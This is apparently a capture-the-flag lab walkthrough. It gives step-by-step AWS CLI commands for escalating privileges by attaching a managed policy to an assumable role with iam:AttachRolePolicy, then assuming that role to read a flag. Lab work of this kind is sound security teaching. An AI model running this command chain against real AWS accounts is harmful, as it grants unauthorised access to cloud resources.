# Walkthrough: AttachRolePolicy Privilege Escalation

## Lab Objective

Learn how to identify and exploit the `iam:AttachRolePolicy` permission to escalate privileges by attaching managed policies to a role, then assuming that role to gain elevated permissions.

## Scenario

You have been provided with access to an entry role with limited permissions. Your goal is to discover a role you can modify, attach a managed policy with elevated permissions to it, assume the role, and retrieve the flag.

## Prerequisites

- AWS CLI installed and configured
- Role ARN from the lab deployment
- Basic understanding of AWS IAM roles and managed policies

## Setup

### Step 1: Assume the Lab Entry Role

Assume the lab entry role using the role ARN provided by the lab deployment:

```bash
# Replace with your specific role ARN from the deployment output
ROLE_ARN="arn:aws:iam::ACCOUNT_ID:role/specter-lab-attachrolepolicy-entry"

# Assume the role and get temporary credentials
CREDS=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name lab-session --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text)

# Export the temporary credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo $CREDS | awk '{print $3}')
export AWS_DEFAULT_REGION="us-east-1"
```

Verify your identity:

```bash
aws sts get-caller-identity | jq
```

Expected output:
```json
{
  "UserId": "AROA...:lab-session",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/specter-lab-attachrolepolicy-entry/lab-session"
}
```

Note that your ARN shows `assumed-role` indicating you're using temporary credentials from the entry role.

## Reconnaissance

### Step 2: Enumerate Current Permissions

Check your inline policies:

```bash
# Extract the role name from your assumed role session
ROLE_NAME=$(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
echo "Current role: $ROLE_NAME"

# List inline policies
aws iam list-role-policies --role-name $ROLE_NAME | jq

# Get the policy document
aws iam get-role-policy --role-name $ROLE_NAME --policy-name specter-lab-attachrolepolicy-entry-policy | jq
```

You should see you have:
- Read permissions on your own role
- `iam:ListRoles`, `iam:GetRole`, `iam:ListAttachedRolePolicies`, `iam:ListRolePolicies`, `iam:GetRolePolicy` to discover roles
- `iam:AttachRolePolicy` on a specific role
- `sts:AssumeRole` on that same role
- `iam:ListPolicies`, `iam:GetPolicy`, `iam:GetPolicyVersion` to discover managed policies

### Step 3: Discover the Target Role

List all IAM roles in the account:

```bash
aws iam list-roles --query 'Roles[*].[RoleName,Description]' --output table
```

Look for the target role:
```
specter-lab-attachrolepolicy-target
```

Get details about the target role:

```bash
TARGET_ROLE="specter-lab-attachrolepolicy-target"

aws iam get-role --role-name $TARGET_ROLE | jq
```

Check the role's trust policy:

```json
{
  "AssumeRolePolicyDocument": {
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:role/specter-lab-attachrolepolicy-entry"
      },
      "Action": "sts:AssumeRole"
    }]
  }
}
```

**Key Finding**: The role trusts your entry role specifically, so you can assume it!

### Step 4: Check Current Role Permissions

List policies currently attached to the role:

```bash
# List managed policies
aws iam list-attached-role-policies --role-name $TARGET_ROLE | jq

# List inline policies
aws iam list-role-policies --role-name $TARGET_ROLE | jq

# Get inline policy details
aws iam get-role-policy --role-name $TARGET_ROLE --policy-name specter-lab-attachrolepolicy-initial | jq
```

The role currently has minimal permissions (just `iam:ListAttachedRolePolicies` and `iam:ListRolePolicies` on itself).

### Step 5: Try to Access the Flag (Will Fail)

First, try assuming the role with its current permissions:

```bash
ROLE_ARN=$(aws iam get-role --role-name $TARGET_ROLE --query 'Role.Arn' --output text)

# Assume the role
aws sts assume-role --role-arn $ROLE_ARN --role-session-name test-session --output json > /tmp/role-creds.json

# Export temporary credentials
export AWS_ACCESS_KEY_ID=$(cat /tmp/role-creds.json | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(cat /tmp/role-creds.json | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(cat /tmp/role-creds.json | jq -r '.Credentials.SessionToken')

# Try to access the flag
aws iam get-role --role-name specter-lab-attachrolepolicy-flag-holder --query 'Role.Tags[?Key==`flag`].Value' --output text
```

Expected error:
```
An error occurred (AccessDenied) when calling the GetRole operation
```

This confirms the role doesn't currently have access to the flag.

### Step 6: Reset Credentials

Unset the temporary credentials and go back to the original user:

```bash
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

# Re-export the original user credentials
export AWS_ACCESS_KEY_ID="<your-original-access-key-id>"
export AWS_SECRET_ACCESS_KEY="<your-original-secret-access-key>"
```

## Exploitation

### Step 7: Discover Available Managed Policies

List all customer-managed policies in the account:

```bash
aws iam list-policies --scope Local --query 'Policies[*].[PolicyName,Arn,Description]' --output table
```

Look for policies that might grant flag access. You should see:
```
specter-lab-attachrolepolicy-flag-access
```

Get details about this policy:

```bash
FLAG_POLICY_ARN=$(aws iam list-policies --scope Local --query 'Policies[?PolicyName==`specter-lab-attachrolepolicy-flag-access`].Arn' --output text)

echo "Flag Access Policy ARN: $FLAG_POLICY_ARN"

# Get the policy version
POLICY_VERSION=$(aws iam get-policy --policy-arn $FLAG_POLICY_ARN --query 'Policy.DefaultVersionId' --output text)

# Get the policy document
aws iam get-policy-version --policy-arn $FLAG_POLICY_ARN --version-id $POLICY_VERSION | jq
```

**Key Finding**: This policy grants `iam:GetRole` and `iam:ListRoleTags` permissions on all resources!

### Step 8: Attach the Policy to the Target Role

Use `iam:AttachRolePolicy` to attach the flag access policy to the target role:

```bash
aws iam attach-role-policy --role-name $TARGET_ROLE --policy-arn $FLAG_POLICY_ARN
```

Expected output: (no output means success)

Verify the policy was attached:

```bash
aws iam list-attached-role-policies --role-name $TARGET_ROLE | jq
```

You should now see the flag access policy attached!

### Step 9: Assume the Role with Elevated Permissions

Now assume the role again, which now has the flag access policy attached:

```bash
aws sts assume-role --role-arn $ROLE_ARN --role-session-name escalated-session --output json > /tmp/escalated-creds.json

# Export the new temporary credentials
export AWS_ACCESS_KEY_ID=$(cat /tmp/escalated-creds.json | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(cat /tmp/escalated-creds.json | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(cat /tmp/escalated-creds.json | jq -r '.Credentials.SessionToken')
```

Verify you're using the assumed role:

```bash
aws sts get-caller-identity | jq
```

Expected output:
```json
{
  "UserId": "AROA...:escalated-session",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/specter-lab-attachrolepolicy-target/escalated-session"
}
```

## Capture the Flag

### Step 10: Retrieve the Flag

Now with the elevated privileges from the attached policy, retrieve the flag:

```bash
aws iam get-role --role-name specter-lab-attachrolepolicy-flag-holder --query 'Role.Tags[?Key==`flag`].Value' --output text
```

Expected output:
```
SPECTER:4tt4ch_r0l3_p0l1cy_3xpl01t
```

## Understanding the Attack

### Why This Works

1. **Policy Attachment**: You had permission to attach managed policies to a specific role
2. **Role Assumption**: You could assume that same role
3. **Immediate Effect**: Attached policies take effect immediately
4. **No Restrictions**: There were no permission boundaries or conditions limiting which policies could be attached

### Attack Flow

```
Entry Role (limited permissions)
    |
    | iam:AttachRolePolicy
    |
Target Role (updated with flag access policy)
    |
    | sts:AssumeRole
    |
Assumed Role (elevated permissions)
    |
    | iam:GetRole on flag holder
    |
Flag Retrieved!
```

## Additional Resources

- [AWS IAM AttachRolePolicy](https://docs.aws.amazon.com/IAM/latest/APIReference/API_AttachRolePolicy.html)
- [IAM Permission Boundaries](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html)
- [Managed vs Inline Policies](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html)
- [Rhino Security Labs: AWS Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)